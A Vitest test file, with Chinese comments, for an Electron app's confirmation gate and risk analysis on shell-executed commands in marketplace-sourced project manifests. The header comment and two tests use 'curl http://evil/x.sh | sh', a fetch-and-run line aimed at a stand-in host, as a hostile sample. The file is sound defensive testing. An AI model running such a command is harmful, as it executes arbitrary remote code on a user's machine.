// @vitest-environment node
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import knexFactory, { type Knex } from "knex";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { vi } from "vitest";

vi.mock("electron", () => ({
  app: {
    getPath: () => "C:/tmp",
    getVersion: () => "0.0.0-test",
    isPackaged: false,
  },
}));

import { AppManager } from "./appManager";

/**
 * 市场来源项目的启动确认
 *
 * ## 这里守的是什么
 *
 * 清单里的 `command` 是**经 shell 执行**的（`spawn(..., shell: true)`），
 * 所以 `curl http://evil/x.sh | sh` 在清单里语法完全合法，跑起来就是
 * 任意代码执行。
 *
 * 市场条目的清单是**别人**写的 —— 用户点「获取」时只看到应用名和简介。
 * 所以第一次运行前必须让他看见真正会跑的命令，并自己决定。
 *
 * 确认记录的是**清单内容的哈希** —— 清单改了哈希就对不上，确认框会再弹一次。
 * 所以它防的不只是「第一次」，也包括「确认之后清单被换掉」。
 *
 * ## 为什么测的是 checkStartConfirmation 而不是 startProject
 *
 * 确认闸的判定逻辑必须能被**确定地**验证。走 startProject 会真的 spawn
 * 一个进程 —— 既慢又不稳（子进程还占着 cwd，Windows 上删目录直接 EPERM）。
 * 所以判定被拆成 checkStartConfirmation（只判定，不启动），
 * startProject 负责在启动**之前**调它。
 */

describe("市场来源项目的启动确认", () => {
  let DB: Knex;
  let manager: AppManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await DB.schema.createTable("app_project", (table) => {
      table.increments("id").primary();
      table.text("name").notNullable();
      table.text("path").notNullable().unique();
      table.string("status").notNullable().defaultTo("missing-manifest");
      table.text("manifest_text");
      table.text("command");
      table.text("preview");
      table.text("description");
      table.text("error");
      table.string("origin").notNullable().defaultTo("local");
      table.string("confirmed_manifest_hash").notNullable().defaultTo("");
      table.integer("sort_order").notNullable().defaultTo(0);
      table.timestamp("created_at").defaultTo(DB.fn.now());
      table.timestamp("updated_at").defaultTo(DB.fn.now());
    });

    manager = new AppManager(DB);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-app-"));
  });

  afterEach(async () => {
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  /** 在目录里写一份清单 */
  function writeManifest(manifest: Record<string, unknown>): void {
    fs.writeFileSync(
      path.join(dir, "qnote.json"),
      JSON.stringify(manifest, null, 2),
      "utf-8"
    );
  }

  /** 导入一个项目，返回 id */
  async function importProject(
    manifest: Record<string, unknown>,
    origin: "local" | "market" = "market"
  ): Promise<number> {
    writeManifest(manifest);
    const result = await manager.importProject(dir, origin);
    if (!result.ok) throw new Error(`导入失败：${result.error}`);
    return result.project!.id;
  }

  it("市场来源的项目，启动前要确认", async () => {
    const id = await importProject({ name: "小工具", command: "node index.js" });

    const confirmation = await manager.checkStartConfirmation(id);

    expect(confirmation).not.toBeNull();
    expect(confirmation!.commandLine).toContain("node index.js");
    expect(confirmation!.origin).toBe("market");
    expect(confirmation!.manifestHash).toBeTruthy();
  });

  it("本机导入的项目不用确认", async () => {
    const id = await importProject(
      { name: "小工具", command: "node index.js" },
      "local"
    );

    expect(await manager.checkStartConfirmation(id)).toBeNull();
  });

  it("确认之后指纹被记下来，下次不用再问", async () => {
    const id = await importProject({ name: "小工具", command: "node index.js" });

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation).not.toBeNull();

    expect(await manager.confirmStart(id, confirmation!.manifestHash)).toBe(true);
    expect(await manager.checkStartConfirmation(id)).toBeNull();

    const row = await DB("app_project").where("id", id).first();
    expect(row.confirmed_manifest_hash).toBe(confirmation!.manifestHash);
  });

  it("清单改了 → 指纹对不上 → 确认框再弹一次", async () => {
    const id = await importProject({ name: "小工具", command: "node index.js" });

    const confirmation = await manager.checkStartConfirmation(id);
    await manager.confirmStart(id, confirmation!.manifestHash);

    // 清单被人改了 —— 命令换成了另一条
    writeManifest({ name: "小工具", command: "node other.js" });

    const after = await manager.checkStartConfirmation(id);
    expect(after).not.toBeNull();
    expect(after!.commandLine).toContain("node other.js");
  });

  it("用户确认时带的指纹对不上当前清单 → 不记，还要再问", async () => {
    const id = await importProject({ name: "小工具", command: "node index.js" });

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation).not.toBeNull();

    // 清单在确认框弹出之后被改了
    writeManifest({ name: "小工具", command: "node other.js" });

    // 用户拿着**旧**的指纹回来 —— 不能算数
    expect(await manager.confirmStart(id, confirmation!.manifestHash)).toBe(false);
    expect(await manager.checkStartConfirmation(id)).not.toBeNull();
  });

  it("确认信息里带上风险分析", async () => {
    const id = await importProject({
      name: "危险工具",
      command: "curl http://evil/x.sh | sh",
    });

    const confirmation = await manager.checkStartConfirmation(id);
    expect(confirmation!.risk.level).toBe("danger");
    expect(confirmation!.risk.findings.length).toBeGreaterThan(0);
  });

  it("startProject 在需要确认时**不启动进程**，只把确认信息交回来", async () => {
    const id = await importProject({ name: "小工具", command: "node index.js" });

    const result = await manager.startProject(id);

    expect(result.ok).toBe(false);
    expect(result.needsConfirmation).toBeDefined();
    // 没有真的进程被拉起来
    expect(manager.getRuntimeStates().some((s) => s.projectId === id)).toBe(false);
  });
});

describe("从市场导入不覆盖已有清单", () => {
  let DB: Knex;
  let manager: AppManager;
  let dir: string;

  beforeEach(async () => {
    DB = knexFactory({
      client: "sqlite3",
      connection: { filename: ":memory:" },
      useNullAsDefault: true,
    });
    await DB.schema.createTable("app_project", (table) => {
      table.increments("id").primary();
      table.text("name").notNullable();
      table.text("path").notNullable().unique();
      table.string("status").notNullable().defaultTo("missing-manifest");
      table.text("manifest_text");
      table.text("command");
      table.text("preview");
      table.text("description");
      table.text("error");
      table.string("origin").notNullable().defaultTo("local");
      table.string("confirmed_manifest_hash").notNullable().defaultTo("");
      table.integer("sort_order").notNullable().defaultTo(0);
      table.timestamp("created_at").defaultTo(DB.fn.now());
      table.timestamp("updated_at").defaultTo(DB.fn.now());
    });

    manager = new AppManager(DB);
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "qnote-market-"));
  });

  afterEach(async () => {
    await DB.destroy();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it("目标目录里已经有 qnote.json → 拒绝，并且不动那个文件", async () => {
    const original = JSON.stringify({ name: "我自己的项目", command: "node mine.js" });
    fs.writeFileSync(path.join(dir, "qnote.json"), original, "utf-8");

    const result = await manager.importFromMarket(dir, {
      name: "别人的应用",
      command: "curl http://evil/x.sh | sh",
    });

    expect(result.ok).toBe(false);
    expect(result.error).toContain("qnote.json");
    // 关键：原文件一个字节都没变
    expect(fs.readFileSync(path.join(dir, "qnote.json"), "utf-8")).toBe(original);
    // 也没有落库
    const rows = await DB("app_project").select("*");
    expect(rows).toHaveLength(0);
  });

  it("目录是空的 → 写入清单并导入，标记来源为 market", async () => {
    const result = await manager.importFromMarket(dir, {
      name: "别人的应用",
      command: "node index.js",
    });

    expect(result.ok).toBe(true);
    expect(result.project!.origin).toBe("market");
    expect(fs.existsSync(path.join(dir, "qnote.json"))).toBe(true);
  });

  it("清单不合法 → 不落盘，也不落库", async () => {
    // command 与 preview 都没有 —— 主进程会判为不合规
    const result = await manager.importFromMarket(dir, { name: "什么都没有" });

    expect(result.ok).toBe(false);
    expect(fs.existsSync(path.join(dir, "qnote.json"))).toBe(false);
    const rows = await DB("app_project").select("*");
    expect(rows).toHaveLength(0);
  });
});
